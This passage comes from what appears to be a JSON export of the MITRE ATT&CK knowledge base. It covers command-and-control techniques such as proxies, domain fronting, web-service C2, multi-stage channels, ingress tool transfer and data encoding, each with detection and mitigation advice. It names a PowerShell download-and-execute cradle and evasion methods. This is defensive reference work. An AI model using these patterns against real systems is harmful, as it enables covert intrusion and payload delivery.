HTRAN, ZXProxy, and ZXPortMap. <a href=\"http://blog.trendmicro.com/trendlabs-security-intelligence/in-depth-look-apt-attack-tools-of-the-trade/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Trend Micro APT Attack Tools)</a> Adversaries use internal proxies to manage command and control communications inside a compromised environment, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between infected systems to avoid suspicion. Internal proxy connections may use common peer-to-peer (p2p) networking protocols, such as SMB, to better blend in with the environment.\n\nBy using a compromised internal system as a proxy, adversaries may conceal the true destination of C2 traffic while reducing the need for numerous connections to external systems.","detection":"Analyze network data for uncommon data flows between clients that should not or often do not communicate with one another. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. <a href=\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: University of Birmingham C2)</a>","platforms":["ESXi","Linux","macOS","Network Devices","Windows"],"dataSources":["Network Traffic: Network Traffic Flow","Network Traffic: Network Traffic Content","Network Traffic: Network Connection Creation"],"mitigations":[{"id":"M1031","name":"Network Intrusion Prevention","description":"Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific C2 protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools. <a href=\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: University of Birmingham C2)</a>"}]},{"id":"T1090.002","name":"External Proxy","description":"Adversaries may use an external proxy to act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap. <a href=\"http://blog.trendmicro.com/trendlabs-security-intelligence/in-depth-look-apt-attack-tools-of-the-trade/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Trend Micro APT Attack Tools)</a> Adversaries use these types of proxies to manage command and control communications, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths to avoid suspicion.\n\nExternal connection proxies are used to mask the destination of C2 traffic and are typically implemented with port redirectors. Compromised systems outside of the victim environment may be used for these purposes, as well as purchased infrastructure such as cloud-based resources or virtual private servers. Proxies may be chosen based on the low likelihood that a connection to them from a compromised system would be investigated. Victim systems would communicate directly with the external proxy on the Internet and then the proxy would forward communications to the C2 server.","detection":"Analyze network data for uncommon data flows, such as a client sending significantly more data than it receives from an external server. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. <a href=\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: University of Birmingham C2)</a>","platforms":["ESXi","Linux","macOS","Network Devices","Windows"],"dataSources":["Network Traffic: Network Connection Creation","Network Traffic: Network Traffic Content","Network Traffic: Network Traffic Flow"],"mitigations":[{"id":"M1031","name":"Network Intrusion Prevention","description":"Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific C2 protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools. <a href=\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: University of Birmingham C2)</a>"}]},{"id":"T1090.003","name":"Multi-hop Proxy","description":"Adversaries may chain together multiple proxies to disguise the source of malicious traffic. Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy. This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source.\n\nFor example, adversaries may construct or use onion routing networks – such as the publicly available Tor network – to transport encrypted C2 traffic through a compromised population, allowing communication with any device within the network. <a href=\"https://en.wikipedia.org/wiki/Onion_routing\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Onion Routing)</a> Adversaries may also use operational relay box (ORB) networks composed of virtual private servers (VPS), Internet of Things (IoT) devices, smart devices, and end-of-life routers to obfuscate their operations. <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/china-nexus-espionage-orb-networks\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ORB Mandiant)</a> \n\nIn the case of network infrastructure, it is possible for an adversary to leverage multiple compromised devices to create a multi-hop proxy chain (i.e., Network Devices). By leveraging Patch System Image on routers, adversaries can add custom code to the affected network devices that will implement onion routing between those nodes. This method is dependent upon the Network Boundary Bridging method allowing the adversaries to cross the protected network boundary of the Internet perimeter and into the organization’s Wide-Area Network (WAN).  Protocols such as ICMP may be used as a transport.  \n\nSimilarly, adversaries may abuse peer-to-peer (P2P) and blockchain-oriented infrastructure to implement routing between a decentralized network of peers. <a href=\"https://unit42.paloaltonetworks.com/manageengine-godzilla-nglite-kdcsponge/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NGLite Trojan)</a>","detection":"When observing use of Multi-hop proxies, network data from the actual command and control servers could allow correlating incoming and outgoing flows to trace malicious traffic back to its source. Multi-hop proxies can also be detected by alerting on traffic to known anonymity networks (such as Tor) or known adversary infrastructure that uses this technique.\n\nIn context of network devices, monitor traffic for encrypted communications from the Internet that is addressed to border routers.  Compare this traffic with the configuration to determine whether it matches with any configured site-to-site Virtual Private Network (VPN) connections the device was intended to have. Monitor traffic for encrypted communications originating from potentially breached routers that is addressed to other routers within the organization.  Compare the source and destination with the configuration of the device to determine if these channels are an authorized Virtual Private Network (VPN) connections or other encrypted modes of communication. Monitor ICMP traffic from the Internet that is addressed to border routers and is encrypted.  Few if any legitimate use cases exist for sending encrypted data to a network device via ICMP.","platforms":["ESXi","Linux","macOS","Network Devices","Windows"],"dataSources":["Network Traffic: Network Traffic Flow","Network Traffic: Network Traffic Content","Network Traffic: Network Connection Creation"],"mitigations":[{"id":"M1037","name":"Filter Network Traffic","description":"Traffic to known anonymity networks and C2 infrastructure can be blocked through the use of network allow and block lists. It should be noted that this kind of blocking may be circumvented by other techniques like Domain Fronting."}]},{"id":"T1090.004","name":"Domain Fronting","description":"Adversaries may take advantage of routing schemes in Content Delivery Networks (CDNs) and other services which host multiple domains to obfuscate the intended destination of HTTPS traffic or traffic tunneled through HTTPS. <a href=\"http://www.icir.org/vern/papers/meek-PETS-2015.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Fifield Blocking Resistent Communication through domain fronting 2015)</a> Domain fronting involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. If both domains are served from the same CDN, then the CDN may route to the address specified in the HTTP header after unwrapping the TLS header. A variation of the the technique, \"domainless\" fronting, utilizes a SNI field that is left blank; this may allow the fronting to work even when the CDN attempts to validate that the SNI and HTTP Host fields match (if the blank SNI fields are ignored).\n\nFor example, if domain-x and domain-y are customers of the same CDN, it is possible to place domain-x in the TLS header and domain-y in the HTTP header. Traffic will appear to be going to domain-x, however the CDN may route it to domain-y.","detection":"If SSL inspection is in place or the traffic is not encrypted, the Host field of the HTTP header can be checked if it matches the HTTPS SNI or against a blocklist or allowlist of domain names. <a href=\"http://www.icir.org/vern/papers/meek-PETS-2015.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Fifield Blocking Resistent Communication through domain fronting 2015)</a>","platforms":["Linux","macOS","Windows","ESXi"],"dataSources":["Network Traffic: Network Traffic Content"],"mitigations":[{"id":"M1020","name":"SSL/TLS Inspection","description":"If it is possible to inspect HTTPS traffic, the captures can be analyzed for connections that appear to be domain fronting."}]}]},{"id":"T1092","name":"Communication Through Removable Media","description":"Adversaries can perform command and control between compromised hosts on potentially disconnected networks using removable media to transfer commands from system to system. <a href=\"http://www.welivesecurity.com/2014/11/11/sednit-espionage-group-attacking-air-gapped-networks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ESET Sednit USBStealer 2014)</a> Both systems would need to be compromised, with the likelihood that an Internet-connected system was compromised first and the second through lateral movement by Replication Through Removable Media. Commands and files would be relayed from the disconnected system to the Internet-connected system to which the adversary has direct access.","detection":"Monitor file access on removable media. Detect processes that execute when removable media is mounted.","platforms":["Linux","macOS","Windows"],"dataSources":["Drive: Drive Creation","Drive: Drive Access"],"mitigations":[{"id":"M1028","name":"Operating System Configuration","description":"Disallow or restrict removable media at an organizational policy level if they are not required for business operations. <a href=\"https://technet.microsoft.com/en-us/library/cc772540(v=ws.10).aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Removable Media Control)</a>"},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Disable Autoruns if it is unnecessary. <a href=\"https://support.microsoft.com/en-us/kb/967715\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Disable Autorun)</a>"}],"subTechniques":[]},{"id":"T1095","name":"Non-Application Layer Protocol","description":"Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. <a href=\"http://en.wikipedia.org/wiki/List_of_network_protocols_%28OSI_model%29\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wikipedia OSI)</a> Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\n\nICMP communication between hosts is one example. <a href=\"https://blogs.cisco.com/security/evolution-of-attacks-on-cisco-ios-devices\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco Synful Knock Evolution)</a> Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. <a href=\"http://support.microsoft.com/KB/170292\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft ICMP)</a> However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.\n\nIn ESXi environments, adversaries may leverage the Virtual Machine Communication Interface (VMCI) for communication between guest virtual machines and the ESXi host. This traffic is similar to client-server communications on traditional network sockets but is localized to the physical machine running the ESXi host, meaning it does not traverse external networks (routers, switches). This results in communications that are invisible to external monitoring and standard networking tools like tcpdump, netstat, nmap, and Wireshark. By adding a VMCI backdoor to a compromised ESXi host, adversaries may persistently regain access from any guest VM to the compromised ESXi host’s backdoor, regardless of network segmentation or firewall rules in place. <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/vmware-esxi-zero-day-bypass/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google Cloud Threat Intelligence VMWare ESXi Zero-Day 2023)</a>","detection":"Analyze network traffic for ICMP messages or other protocols that contain abnormal data or are not normally seen within or exiting the network. <a href=\"https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco Blog Legacy Device Attacks)</a>\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. <a href=\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: University of Birmingham C2)</a> \n\nMonitor and investigate API calls to functions associated with enabling and/or utilizing alternative communication channels.","platforms":["ESXi","Linux","macOS","Network Devices","Windows"],"dataSources":["Network Traffic: Network Traffic Content","Network Traffic: Network Traffic Flow"],"mitigations":[{"id":"M1030","name":"Network Segmentation","description":"Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports and through proper network gateway systems. Also ensure hosts are only provisioned to communicate over authorized interfaces."},{"id":"M1031","name":"Network Intrusion Prevention","description":"Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level."},{"id":"M1037","name":"Filter Network Traffic","description":"Filter network traffic to prevent use of protocols across the network boundary that are unnecessary.  If VMCI is not required in ESXi environments, consider restricting guest virtual machines from accessing VMCI services. <a href=\"https://techdocs.broadcom.com/us/en/vmware-cis/vsphere/vsphere/7-0/vsphere-virtual-machine-administration-guide-7-0/configuring-virtual-machine-hardwarevm-admin/virtual-machine-network-configurationvm-admin/serial-port-configurationvm-admin/configure-the-virtual-machine-communication-interface-firewallvm-admin.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Broadcom VMCI Firewall)</a>"},{"id":"M1047","name":"Audit","description":"Periodically investigate ESXi hosts for open VMCI ports. Running the <code>lsof -A</code> command and inspecting results with a type of <code>SOCKET_VMCI</code> will reveal processes that have open VMCI ports. <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/vmware-detection-containment-hardening\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google Cloud Threat Intelligence ESXi Hardening 2023)</a>"}],"subTechniques":[]},{"id":"T1102","name":"Web Service","description":"Adversaries may use an existing, legitimate external Web service as a means for relaying data to/from a compromised system. Popular websites, cloud services, and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google, Microsoft, or Twitter, makes it easier for adversaries to hide in expected noise. <a href=\"https://www.broadcom.com/support/security-center/protection-bulletin/birdyclient-malware-leverages-microsoft-graph-api-for-c-c-communication\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Broadcom BirdyClient Microsoft Graph API 2024)</a> Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.\n\nUse of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).","detection":"Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Packet capture analysis will require SSL/TLS inspection if data is encrypted. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). User behavior monitoring may help to detect abnormal patterns of activity. <a href=\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: University of Birmingham C2)</a>","platforms":["ESXi","Linux","macOS","Windows"],"dataSources":["Network Traffic: Network Traffic Flow","Network Traffic: Network Traffic Content","Network Traffic: Network Connection Creation"],"mitigations":[{"id":"M1021","name":"Restrict Web-Based Content","description":"Web proxies can be used to enforce external network communication policy that prevents use of unauthorized external services."},{"id":"M1031","name":"Network Intrusion Prevention","description":"Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level."}],"subTechniques":[{"id":"T1102.001","name":"Dead Drop Resolver","description":"Adversaries may use an existing, legitimate external Web service to host information that points to additional command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.\n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.\n\nUse of a dead drop resolver may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).","detection":"Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Packet capture analysis will require SSL/TLS inspection if data is encrypted. User behavior monitoring may help to detect abnormal patterns of activity. <a href=\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: University of Birmingham C2)</a>","platforms":["ESXi","Linux","macOS","Windows"],"dataSources":["Network Traffic: Network Traffic Content","Network Traffic: Network Traffic Flow"],"mitigations":[{"id":"M1021","name":"Restrict Web-Based Content","description":"Web proxies can be used to enforce external network communication policy that prevents use of unauthorized external services."},{"id":"M1031","name":"Network Intrusion Prevention","description":"Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level."}]},{"id":"T1102.002","name":"Bidirectional Communication","description":"Adversaries may use an existing, legitimate external Web service as a means for sending commands to and receiving output from a compromised system over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems can then send the output from those commands back over that Web service channel. The return traffic may occur in a variety of ways, depending on the Web service being utilized. For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet. \n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.","detection":"Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Packet capture analysis will require SSL/TLS inspection if data is encrypted. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). User behavior monitoring may help to detect abnormal patterns of activity. <a href=\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: University of Birmingham C2)</a>","platforms":["ESXi","Linux","macOS","Windows"],"dataSources":["Network Traffic: Network Traffic Content","Network Traffic: Network Connection Creation","Network Traffic: Network Traffic Flow"],"mitigations":[{"id":"M1021","name":"Restrict Web-Based Content","description":"Web proxies can be used to enforce external network communication policy that prevents use of unauthorized external services."},{"id":"M1031","name":"Network Intrusion Prevention","description":"Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level."}]},{"id":"T1102.003","name":"One-Way Communication","description":"Adversaries may use an existing, legitimate external Web service as a means for sending commands to a compromised system without receiving return output over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems may opt to send the output from those commands back over a different C2 channel, including to another distinct Web service. Alternatively, compromised systems may return no output at all in cases where adversaries want to send instructions to systems and do not want a response.\n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.","detection":"Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Packet capture analysis will require SSL/TLS inspection if data is encrypted. Analyze network data for uncommon data flows. User behavior monitoring may help to detect abnormal patterns of activity. <a href=\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: University of Birmingham C2)</a>","platforms":["Linux","macOS","Windows","ESXi"],"dataSources":["Network Traffic: Network Connection Creation","Network Traffic: Network Traffic Flow","Network Traffic: Network Traffic Content"],"mitigations":[{"id":"M1021","name":"Restrict Web-Based Content","description":"Web proxies can be used to enforce external network communication policy that prevents use of unauthorized external services."},{"id":"M1031","name":"Network Intrusion Prevention","description":"Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level."}]}]},{"id":"T1104","name":"Multi-Stage Channels","description":"Adversaries may create multiple stages for command and control that are employed under different conditions or for certain functions. Use of multiple stages may obfuscate the command and control channel to make detection more difficult.\n\nRemote access tools will call back to the first-stage command and control server for instructions. The first stage may have automated capabilities to collect basic host information, update tools, and upload additional files. A second remote access tool (RAT) could be uploaded at that point to redirect the host to the second-stage command and control server. The second stage will likely be more fully featured and allow the adversary to interact with the system through a reverse shell and additional RAT features.\n\nThe different stages will likely be hosted separately with no overlapping infrastructure. The loader may also have backup first-stage callbacks or Fallback Channels in case the original first-stage communication path is discovered and blocked.","detection":"Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure. Relating subsequent actions that may result from Discovery of the system and network information or Lateral Movement to the originating process may also yield useful data.","platforms":["Linux","macOS","Windows","ESXi"],"dataSources":["Network Traffic: Network Traffic Flow","Network Traffic: Network Connection Creation"],"mitigations":[{"id":"M1031","name":"Network Intrusion Prevention","description":"Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level."}],"subTechniques":[]},{"id":"T1105","name":"Ingress Tool Transfer","description":"Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \n\nOn Windows, adversaries may use various utilities to download tools, such as <code>copy</code>, <code>finger</code>, certutil, and PowerShell commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as <code>curl</code>, <code>scp</code>, <code>sftp</code>, <code>tftp</code>, <code>rsync</code>, <code>finger</code>, and <code>wget</code>. <a href=\"https://lolbas-project.github.io/#t1105\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: t1105_lolbas)</a>  A number of these tools, such as <code>wget</code>, <code>curl</code>, and <code>scp</code>, also exist on ESXi. After downloading a file, a threat actor may attempt to verify its integrity by checking its hash value (e.g., via <code>certutil -hashfile</code>). <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/cosmicenergy-ot-malware-russian-response/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google Cloud Threat Intelligence COSCMICENERGY 2023)</a>\n\nAdversaries may also abuse installers and package managers, such as <code>yum</code> or <code>winget</code>, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows <code>search-ms</code> protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures). <a href=\"https://www.trellix.com/blogs/research/beyond-file-search-a-novel-method/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: T1105: Trellix_search-ms)</a>\n\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. <a href=\"https://www.ptsecurity.com/upload/corporate/ww-en/analytics/Cobalt-Snatch-eng.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: PTSecurity Cobalt Dec 2016)</a> In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine. <a href=\"https://www.technologyreview.com/2013/08/21/83143/dropbox-and-similar-services-can-sync-malware/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Dropbox Malware Sync)</a>","detection":"Monitor for file creation and files transferred into the network. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as ftp, that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Specifically, for the finger utility on Windows and Linux systems, monitor command line or terminal execution for the finger command. Monitor network activity for TCP port 79, which is used by the finger utility, and Windows <code>netsh interface portproxy</code> modifications to well-known ports such as 80 and 443. Furthermore, monitor file system for the download/creation and execution of suspicious files, which may indicate adversary-downloaded payloads. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. <a href=\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: University of Birmingham C2)</a>","platforms":["ESXi","Linux","macOS","Network Devices","Windows"],"dataSources":["File: File Creation","Network Traffic: Network Traffic Content","Network Traffic: Network Traffic Flow","Command: Command Execution","Network Traffic: Network Connection Creation"],"mitigations":[{"id":"M1031","name":"Network Intrusion Prevention","description":"Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools. <a href=\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: University of Birmingham C2)</a>"},{"id":"M1037","name":"Filter Network Traffic","description":"Use network filtering to block outbound traffic from compromised systems to unapproved external destinations. Restricting access to known, trusted IP addresses and protocols can prevent attackers from downloading malicious tools or payloads onto compromised servers after gaining initial access."}],"subTechniques":[]},{"id":"T1132","name":"Data Encoding","description":"Adversaries may encode data to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system. Use of data encoding may adhere to existing protocol specifications and includes use of ASCII, Unicode, Base64, MIME, or other binary-to-text and character encoding systems. <a href=\"https://en.wikipedia.org/wiki/Binary-to-text_encoding\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wikipedia Binary-to-text Encoding)</a> <a href=\"https://en.wikipedia.org/wiki/Character_encoding\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wikipedia Character Encoding)</a> Some data encoding systems may also result in data compression, such as gzip.","detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. <a href=\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: University of Birmingham C2)</a>","platforms":["ESXi","Linux","macOS","Windows"],"dataSources":["Network Traffic: Network Traffic Content"],"mitigations":[{"id":"M1031","name":"Network Intrusion Prevention","description":"Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools. <a href=\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: University of Birmingham C2)</a>"}],"subTechniques":[{"id":"T1132.001","name":"Standard Encoding","description":"Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME. <a href=\"https://en.wikipedia.org/wiki/Binary-to-text_encoding\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wikipedia Binary-to-text Encoding)</a> <a href=\"https://en.wikipedia.org/wiki/Character_encoding\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wikipedia Character Encoding)</a> Some data encoding systems may also result in data compression, such as gzip.","detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. <a href=\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: University of Birmingham C2)</a>","platforms":["ESXi","Linux","macOS","Windows"],"dataSources":["Network Traffic: Network Traffic Content"],"mitigations":[{"id":"M1031","name":"Network Intrusion Prevention","description":"Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools."}]},{"id":"T1132.002","name":"Non-Standard Encoding","description":"Adversaries may encode data with a non-standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a non-standard data encoding system that diverges from existing protocol specifications. Non-standard data encoding schemes may be based on or related to standard data encoding schemes, such as a modified Base64 encoding for the message body of an HTTP request. <a href=\"https://en.wikipedia.org/wiki/Binary-to-text_encoding\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wikipedia Binary-to-text Encoding)</a> <a href=\"https://en.wikipedia.org/wiki/Character_encoding\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wikipedia Character Encoding)</a>","detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. <a href=\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: University of Birmingham C2)</a>","platforms":["ESXi","Linux","macOS","Windows"],"dataSources":["Network Traffic: Network Traffic Content"],"mitigations":[{"id":"M1031","name":"Network Intrusion Prevention","description":"Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools."}]}]},{"id":"T1205","name":"Traffic Signaling","description":"Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of 